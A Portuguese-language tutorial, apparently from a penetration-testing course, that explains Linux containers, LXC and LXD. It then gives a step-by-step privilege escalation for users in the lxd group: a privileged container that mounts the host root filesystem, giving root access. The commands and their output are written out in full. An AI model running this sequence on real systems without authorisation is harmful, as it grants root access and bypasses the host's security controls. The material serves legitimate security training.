# Containers

Containers operam no nível do sistema operacional, enquanto máquinas virtuais operam no nível de hardware. Containers, portanto, compartilham um único sistema operacional e isolam os processos das aplicações do restante do sistema, enquanto a virtualização clássica permite que múltiplos sistemas operacionais rodem simultaneamente em um único sistema.

Isolamento e virtualização são essenciais porque ajudam a gerenciar recursos e aspectos de segurança da forma mais eficiente possível. Por exemplo, eles facilitam o monitoramento para encontrar erros no sistema que muitas vezes não têm relação com aplicações recém-desenvolvidas. Outro exemplo seria o isolamento de processos que normalmente exigem privilégios de root. Uma aplicação desse tipo poderia ser uma aplicação web ou API que precisa ser isolada do sistema host para evitar escalonamento até os bancos de dados.

## Linux Containers

Linux Containers (LXC) é uma técnica de virtualização em nível de sistema operacional que permite que múltiplos sistemas Linux rodem isolados uns dos outros em um único host, cada um possuindo seus próprios processos, mas compartilhando o kernel do sistema host. O LXC é muito popular devido à sua facilidade de uso e se tornou uma parte essencial da segurança de TI.

Por padrão, o LXC consome menos recursos do que uma máquina virtual e possui uma interface padronizada, o que facilita o gerenciamento de múltiplos containers simultaneamente. Uma plataforma com LXC pode até ser organizada em múltiplas nuvens, proporcionando portabilidade e garantindo que aplicações funcionando corretamente no sistema do desenvolvedor também funcionarão em qualquer outro sistema. Além disso, aplicações grandes podem ser iniciadas, paradas ou ter suas variáveis de ambiente alteradas através da interface de containers Linux.

A facilidade de uso do LXC é sua vantagem mais significativa em comparação com as técnicas de virtualização clássicas. No entanto, a enorme disseminação do LXC, um ecossistema quase abrangente e ferramentas inovadoras se devem principalmente à plataforma Docker, que consolidou os containers Linux. Todo o processo, desde a criação de templates de containers e sua implantação, configuração do sistema operacional e rede, até a implantação de aplicações, permanece o mesmo.

## Linux Daemon

Linux Daemon (LXD) é semelhante em alguns aspectos, mas é projetado para conter um sistema operacional completo. Portanto, não é um container de aplicação, mas sim um container de sistema. Antes de podermos usar esse serviço para escalar nossos privilégios, precisamos pertencer ao grupo `lxc` ou `lxd`. Podemos descobrir isso com o seguinte comando:

```shellsession
container-user@nix02:~$ id
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

A partir daqui, existem várias maneiras pelas quais podemos explorar o LXC/LXD. Podemos criar nosso próprio container e transferi-lo para o sistema alvo, ou usar um container já existente. Infelizmente, administradores costumam usar templates com pouca ou nenhuma segurança. Essa postura tem como consequência que muitas vezes já existem ferramentas que podemos usar contra o próprio sistema.

```shellsession
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls
ubuntu-template.tar.xz
```

Templates desse tipo frequentemente não possuem senhas, especialmente se forem ambientes de teste simples. Eles devem ser rapidamente acessíveis e fáceis de usar. O foco em segurança complicaria toda a inicialização, tornando-a mais difícil e, portanto, consideravelmente mais lenta. Se tivermos um pouco de sorte e houver um container desses no sistema, ele pode ser explorado. Para isso, precisamos importar esse container como uma imagem.

```shellsession
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

Depois de verificar que essa imagem foi importada com sucesso, podemos iniciar a imagem e configurá-la especificando a flag `security.privileged` e o caminho raiz para o container. Essa flag desativa todos os recursos de isolamento que nos permitem agir sobre o host.

```shellsession
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Feito isso, podemos iniciar o container e logar nele. Dentro do container, podemos então navegar até o caminho especificado para acessar os recursos do sistema host como root.

```shellsession
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root
total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

> **Nota:** Nem toda distro usa `/bin/bash` como shell padrão dentro do container — vale sempre checar. Alguns caminhos comuns por distro:

| Distro | Caminho do shell |
|---|---|
| Ubuntu / Debian | `/bin/bash` |
| Alpine | `/bin/sh` |
| CentOS / RHEL / Fedora | `/bin/bash` |
| Busybox (imagens minimalistas) | `/bin/sh` |
| Arch Linux | `/bin/bash` |
| openSUSE | `/bin/bash` |
| Void Linux | `/bin/bash` ou `/bin/sh` |
| Distroless (sem shell) | nenhum — usar `lxc exec` com o próprio binário da aplicação, se existir |
